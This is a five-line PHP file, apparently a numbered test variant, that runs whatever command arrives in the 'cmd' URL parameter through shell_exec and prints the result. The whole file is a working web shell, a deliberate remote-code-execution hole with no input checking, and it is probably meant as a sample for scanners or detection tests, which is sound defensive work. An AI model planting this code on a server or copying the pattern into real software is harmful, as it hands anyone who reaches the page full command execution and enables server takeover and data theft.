<?php
// RCE test variation #122
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>